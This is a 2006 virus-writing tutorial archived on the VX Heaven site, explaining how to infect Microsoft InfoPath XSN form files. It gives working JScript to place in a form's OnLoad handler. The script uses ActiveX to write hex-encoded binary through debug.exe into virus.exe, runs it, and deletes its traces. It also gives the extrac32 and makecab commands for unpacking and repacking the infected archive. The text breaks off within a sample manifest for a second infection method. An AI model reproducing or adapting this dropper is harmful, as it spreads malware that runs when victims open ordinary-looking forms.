<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> SPTH 'Computerviruses meet Infopath' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="SPTH"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, SPTH,Computerviruses meet Infopath, windows, binary, function, infopath, code, virus, shell, infection, type, onload, office, file, write, microsoft, functions"/>
<meta name="Description" content="Microsoft Office Infopath has been released in Office 2003. It is a XML based interactive formulare-generation tool. Infopath works perfectly together with Microsoft Windows SharePoint Server and Microsoft Office SharePoint Services. You can import and export data via MS-SQL or XML files, if you prefer that. You can create connections between objects very easiely and you can make anything automatic with scripts behind the document. When I had to learn Infopath, I sat there with a 500 pages book, and was quite bored. When I read about Infopath-Macros, I thought about doing something more interesting... I wrote a virus that infects Infopath XSN files. And here we are..."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"960e06a799264f7de2cbfb240ab6c8075759041d-1498755940-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vsp31.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Computerviruses meet Infopath</h1><p><a href="/lib/?lang=en&amp;author=SPTH"> SPTH</a><br/> <em><a href="/vx.php?fid=1512#f1512">Ready Rangers Liberation Front [7]</a></em><br/> <em>March 2006</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vsp31.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=MA#vsp31">Back to index</a>] [<a href="/lib/vsp31.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c0">Intro</a></li>
<li><a href="#c1">How does InfoPath work</a></li>
<li><a href="#c2">Infection Type I: Virus in script.js</a>
<ul>
<li><a href="#c21">Open a XSN file</a></li>
<li><a href="#c22">Searching the infectable position</a></li>
<li><a href="#c23">Dropping the binary virus code</a></li>
<li><a href="#c24">Re-generating the XSN file</a></li>
</ul></li>
<li><a href="#c3">Infection Type II: Virus in Cabinet-Archive</a>
<ul>
<li><a href="#c31">Modify manifest.XSF</a></li>
<li><a href="#c32">The Problem: Executing the code</a></li>
</ul></li>
<li><a href="#c4">Find more Files</a></li>
<li><a href="#c5">Last words</a></li>
</ul>
<h2><a name="c0"></a>Intro</h2>
<p>Microsoft Office Infopath has been released in Office 2003. It is a XML based interactive formulare-generation tool. Infopath works perfectly together with Microsoft Windows SharePoint Server and Microsoft Office SharePoint Services. You can import and export data via MS-SQL or XML files, if you prefer that. You can create connections between objects very easiely and you can make anything automatic with scripts behind the document. When I had to learn Infopath, I sat there with a 500 pages book, and was quite bored. When I read about Infopath-Macros, I thought about doing something more interesting... I wrote a virus that infects Infopath XSN files. And here we are...</p>
<h2><a name="c1"></a>How does InfoPath work</h2>
<p>Infopath file-extantion is .XSN. These files are simple Cabinet Archives. When we open such an archive, we can see manifest.xsf (more about it later), several XML files, XSD (XML schema files), XSL (XML Stylesheet files), GIFs, and highly probably a file called script.js. In the Cabinett archive, the manifest.xsf has to be the first compressed file. This file contains (in XML language) the data about all other files in the archive. That means, Infopath decompresses the cabinet-file (XSN) and opens the manifest.xsf to organize the formulare. Now, for viruses it's important that you can write macros and create functions behind every object. This program does not use simple VBA as all other Office products use, but it uses eighter VBS or JS (which is used by default - and every sample code about Infopath I could find has been written in JS). When I read a little bit about this macros, I feeled like they wanted us to write viruses for it. The JS is able to use ActiveX (including new objects as 'FileSystemObject' or 'WScript.Shell'), and more important: An empty onload-function is included in every script.js in case at least one time the (included) Script-Editor has been opened. Very nice - thanks to the Infopath structure-creator! :D</p>
<h2><a name="c2"></a>Infection Type I: Virus in script.js</h2>
<p>This infection type has been done by me in my first infopath-virus. Let's say the virus is an .exe file. It searchs for .XSN files whereever it wants. If it finds a file, the file will be opened...</p>
<h3><a name="c21"></a>Open a XSN file</h3>
<p>This is not as simple as it may sound. As I've already written, XSN files are archives, and we have to extract them. But per fortuna Microsoft provides an very helpful (but annoying buggy) tool by default in every windows version that I have tested (Windows NT, Windows 2000, Windows XP and Windows 2003). The tool can be found at '%system%\extrac32.exe', and it is undocumented, which means that you can not find any information about it by commandline (for example: 'extrac32 /?'). By searching some time at the internet, we found the parameters for extracting .CAB files:</p>
<div class="dos" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #33cc33;">%</span><span style="color: #448888;">system</span><span style="color: #33cc33;">%</span>\extrac32.exe /e /a <span style="color: #33cc33;">%</span><span style="color: #448888;">filename</span><span style="color: #33cc33;">%</span><br/>
&nbsp;</div>
<p>%system%: Represents the path of the system-directory (for example: 'C:\WinNT\system32\')</p>
<p>%filename%: The filename of the cabinet-file, which should be extracted.</p>
<p>When you run that command, the file will be extracted in the current directory. (Note: The extrac32.exe contains a very annoying bug: If one of the decompressed files already exists in the current directory, it creates an infinitive loop and starts using 100% CPU speed).</p>
<h3><a name="c22"></a>Searching the infectable position</h3>
<p>I've already mentioned that the file we need is script.js. For understanding this file better, you'll see the original (beside of the OnClick-Event) empty file:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #006600; font-style: italic;">/*<br/>
&nbsp;* This file contains functions for data validation and form-level events.<br/>
&nbsp;* Because the functions are referenced in the form definition (.xsf) file, <br/>
&nbsp;* it is recommended that you do not modify the name of the function,<br/>
&nbsp;* or the name and number of arguments.<br/>
&nbsp;*<br/>
*/</span><br/>
<br/>
<span style="color: black; font-style: italic;">// The following line is created by Microsoft Office InfoPath to define the prefixes</span><br/>
<span style="color: black; font-style: italic;">// for all the known namespaces in the main XML data file.</span><br/>
<span style="color: black; font-style: italic;">// Any modification to the form files made outside of InfoPath</span><br/>
<span style="color: black; font-style: italic;">// will not be automatically updated.</span><br/>
<span style="color: black; font-style: italic;">//&lt;namespacesDefinition&gt;</span><br/>
XDocument.<span style="color: #660066;">DOM</span>.<span style="color: #660066;">setProperty</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;SelectionNamespaces&quot;</span><span style="color: #339933;">,</span> <span style="color: #3366CC;">'xmlns:my=&quot;http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11&quot;'</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: black; font-style: italic;">//&lt;/namespacesDefinition&gt;</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">//=======</span><br/>
<span style="color: black; font-style: italic;">// The following function handler is created by Microsoft Office InfoPath.</span><br/>
<span style="color: black; font-style: italic;">// Do not modify the name of the function, or the name and number of arguments.</span><br/>
<span style="color: black; font-style: italic;">//=======</span><br/>
<span style="color: #000066; font-weight: bold;">function</span> CTRL1_5<span style="color: #339933;">::</span>OnClick<span style="color: black;">&#40;</span>eventObj<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Write your code here</span><br/>
<span style="color: black;">&#125;</span><br/>
<br/>
<span style="color: #000066; font-weight: bold;">function</span> XDocument<span style="color: #339933;">::</span>OnLoad<span style="color: black;">&#40;</span>eventObj<span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">// Write your code here</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;<span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span><span style="color: black;">&#91;</span>Empty script.<span style="color: #660066;">js</span><span style="color: black;">&#93;</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span> <span style="color: #339933;">-</span><br/>
&nbsp;</div>
<p>Now we know how the file looks, and how to get the position of the infectable function: We simply search for the string: 'XDocument::OnLoad(eventObj)'. By that, we find the OnLoad event of the current-Document-object. This is exactly what we need.</p>
<h3><a name="c23"></a>Dropping the binary virus code</h3>
<p>After finding the pointer to infect, we can drop the code of our binary now. In real, this is not as easy as it sounds. JScript has been designed to be "secure", and can not handle binary data - in theory. But per fortuna Microsoft has installed a tool by default, which will help us manage that problem: debug.exe (mille grazie per SlageHammer! +g+). For that, we have to convert the binary virus code to hex code, and insert it into a JScript - which will look like this:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #000066; font-weight: bold;">var</span> fso<span style="color: #339933;">,</span>shell<span style="color: #339933;">,</span>nxln<span style="color: #339933;">,</span>wsc<span style="color: #339933;">,</span>filee<span style="color: #339933;">;</span><br/>
nxln<span style="color: #339933;">=</span><span style="">String</span>.<span style="color: #660066;">fromCharCode</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">13</span><span style="color: #339933;">,</span><span style="color: #CC0000;">10</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
fso<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Scripting.FileSystemObject&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
file<span style="color: #339933;">=</span>fso.<span style="color: #660066;">CreateTextFile</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.txt&quot;</span><span style="color: #339933;">,</span> <span style="color: #003366; font-weight: bold;">true</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
file.<span style="color: #660066;">Write</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;e 0100 4D 5A 80 00 .....<span style="color: #000099; font-weight: bold;">\n</span>rcx<span style="color: #000099; font-weight: bold;">\n</span>FILESIZE<span style="color: #000099; font-weight: bold;">\n</span>n C:<span style="color: #000099; font-weight: bold;">\\</span>virus.dmp<span style="color: #000099; font-weight: bold;">\n</span>w<span style="color: #000099; font-weight: bold;">\n</span>q&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
file.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
shell<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;WScript.Shell&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>filee<span style="color: #339933;">=</span>fso.<span style="color: #660066;">CreateTextFile</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>test.bat&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
filee.<span style="color: #660066;">Write</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;debug&lt;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.txt&quot;</span><span style="color: #339933;">+</span>nxln<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;ren C:<span style="color: #000099; font-weight: bold;">\\</span>virus.dmp C:<span style="color: #000099; font-weight: bold;">\\</span>virus.exe&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
filee.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
shell.<span style="color: #660066;">Run</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>test.bat&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #006600; font-style: italic;">/*<br/>
&nbsp;* Here you have to have something that waits ~1 second,<br/>
&nbsp;* because the .BAT file has to finish before doing anything else.<br/>
&nbsp;* suggestions: 'for (i=0; i&lt;1000000; i++) {}' or something like that<br/>
&nbsp;*<br/>
*/</span><br/>
<span style="color: #000066; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>fso.<span style="color: #660066;">FileExists</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.exe&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> fso.<span style="color: #660066;">DeleteFile</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.exe&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
<span style="color: #000066; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>fso.<span style="color: #660066;">FileExists</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>test.bat&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> fso.<span style="color: #660066;">DeleteFile</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>test.bat&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
<span style="color: #000066; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>fso.<span style="color: #660066;">FileExists</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.DMP&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> fso.<span style="color: #660066;">CopyFile</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.DMP&quot;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.exe&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
<span style="color: #000066; font-weight: bold;">if</span> <span style="color: black;">&#40;</span>fso.<span style="color: #660066;">FileExists</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.DMP&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span> <span style="color: black;">&#123;</span> fso.<span style="color: #660066;">DeleteFile</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.DMP&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span> <span style="color: black;">&#125;</span><br/>
shell.<span style="color: #660066;">Run</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;C:<span style="color: #000099; font-weight: bold;">\\</span>virus.exe&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp;</div>
<p>We generate and execute a file called virus.exe at C:\. It seems like C:\ would be the current directory for the file now - and it searchs for files in there - but that is not true. The file-process has been created by the Infopath formular macro, and the .exe has the Current Directory (GetCurrentDiretory) as the running .XSN file. This is a very great advantage for viruswriting, otherwise we would have had to search for more files in an other way.</p>
<h3><a name="c24"></a>Re-generating the XSN file</h3>
<p>After successful infection of the script.JS, we have to pack them again into a cabinet archive. Sounds like brainfuck - but isn't :-) Microsoft has once more provided a installed-by-default tool (in all Windows versions I've tested), which will do most of our work. The tool we have found is called makecab.exe. Here a short explanation of itself:</p>
<pre>
Microsoft (R) Cabinet Maker - Version 5.1.2600.2180
Copyright (c) Microsoft Corporation. All rights reserved..

MAKECAB [/V[n]] [/D var=value ...] [/L dir] source [destination]
MAKECAB [/V[n]] [/D var=value ...] /F directive_file [...]

  source File to compress.
  destination    File name to give compressed file.  If omitted, the
 last character of the source file name is replaced
 with an underscore (_) and used as the destination.
  /F directives  A file with MakeCAB directives (may be repeated).
  /D var=value   Defines variable with specified value.
  /L dir Location to place destination (default is current directory).
  /V[n]  Verbosity level (1..3).
</pre>
<p>We see that we have to use 'MAKECAB /F directive_file', as we need to pack more than one file. OK, but what the hell is a directive file? Microsoft MAKECAB SDK (yes, something like that happens +g+) explains us that a directive file contains the filenames and the order of filenames which should be packed. As I've mentioned somewhere above, manifest.xsf has to be the first file, the further order is not important. This is a directive-file of a simple XSN file:</p>
<pre>
directive.txt:
- - -
manifest.xsf
myschema.xsd
sampledata.xml
script.js
template.xml
view1.xsl
- - -
</pre>
<p>Now we can use the command 'MAKECAB /f directive.txt' - and immediatly a new .cab file has been created in the default directory with default filename: 'disk1/1.cab'. Finally, we can remove the old, uninfected XSN file with the new one.</p>
<h2><a name="c3"></a>Infection Type II: Virus in Cabinet-Archive</h2>
<p>This is another infection type of XSN files, but still I dont know if it is fully possible. Advantage: No need of debug.exe...</p>
<p>At this idea we don't drop the hex-code of the binary virus in the script.js, but copy the virus.exe itself into the archive, and modify manifest.xsf and script.js.</p>
<h3><a name="c31"></a>Modify manifest.XSF</h3>
<p>As every file of the archive has to be in the XML Form (manifest.xsf) File, we have to add our file too. First let's see a standard manifest.XSF file:</p>
<div class="xml" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;?xml</span> <span style="color: #000066;">version</span>=<span style="color: #ff0000;">&quot;1.0&quot;</span> <span style="color: #000066;">encoding</span>=<span style="color: #ff0000;">&quot;UTF-8&quot;</span><span style="color: #000000; font-weight: bold;">?&gt;</span></span><br/>
<span style="color: #808080; font-style: italic;">&lt;!--</span><br/>
<span style="color: #808080; font-style: italic;">This file is automatically created and modified by Microsoft Office InfoPath.</span><br/>
<span style="color: #808080; font-style: italic;">Changes made to the file outside of InfoPath might be lost if the form template is modified in InfoPath.</span><br/>
<span style="color: #808080; font-style: italic;">--&gt;</span><br/>
<span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:xDocumentClass</span> <span style="color: #000066;">publishUrl</span>=<span style="color: #ff0000;">&quot;E:\temp\Template1.xsn&quot;</span> <span style="color: #000066;">solutionVersion</span>=<span style="color: #ff0000;">&quot;1.0.0.3&quot;</span> <span style="color: #000066;">productVersion</span>=<span style="color: #ff0000;">&quot;11.0.5531&quot;</span> <span style="color: #000066;">solutionFormatVersion</span>=<span style="color: #ff0000;">&quot;1.0.0.0&quot;</span> <span style="color: #000066;">xmlns:xsf</span>=<span style="color: #ff0000;">&quot;http://schemas.microsoft.com/office/infopath/2003/solutionDefinition&quot;</span> <span style="color: #000066;">xmlns:msxsl</span>=<span style="color: #ff0000;">&quot;urn:schemas-microsoft-com:xslt&quot;</span> <span style="color: #000066;">xmlns:xd</span>=<span style="color: #ff0000;">&quot;http://schemas.microsoft.com/office/infopath/2003&quot;</span> <span style="color: #000066;">xmlns:xsi</span>=<span style="color: #ff0000;">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span style="color: #000066;">xmlns:my</span>=<span style="color: #ff0000;">&quot;http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:package<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:files<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:file</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;myschema.xsd&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:fileProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:property</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;namespace&quot;</span> <span style="color: #000066;">type</span>=<span style="color: #ff0000;">&quot;string&quot;</span> <span style="color: #000066;">value</span>=<span style="color: #ff0000;">&quot;http://schemas.microsoft.com/office/infopath/2003/myXSD/2006-02-26T02:21:11&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:property<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:property</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;editability&quot;</span> <span style="color: #000066;">type</span>=<span style="color: #ff0000;">&quot;string&quot;</span> <span style="color: #000066;">value</span>=<span style="color: #ff0000;">&quot;full&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:property<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:property</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;rootElement&quot;</span> <span style="color: #000066;">type</span>=<span style="color: #ff0000;">&quot;string&quot;</span> <span style="color: #000066;">value</span>=<span style="color: #ff0000;">&quot;myFields&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:property<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:fileProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:file<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:file</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;template.xml&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:file<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:file</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;sampledata.xml&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:fileProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;xsf:property</span> <span style="color: #000066;">name</span>=<span style="color: #ff0000;">&quot;fileType&quot;</span> <span style="color: #000066;">type</span>=<span style="color: #ff0000;">&quot;string&quot;</span> <span style="color: #000066;">value</span>=<span style="color: #ff0000;">&quot;sampleData&quot;</span><span style="color: #000000; font-weight: bold;">&gt;</span><span style="color: #000000; font-weight: bold;">&lt;/xsf:property<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:fileProperties<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #009900;"><span style="color: #000000; font-weight: bold;">&lt;/xsf:file<span style="color: #000000; font-weight: bold;">&gt;</span></span></span><br/>
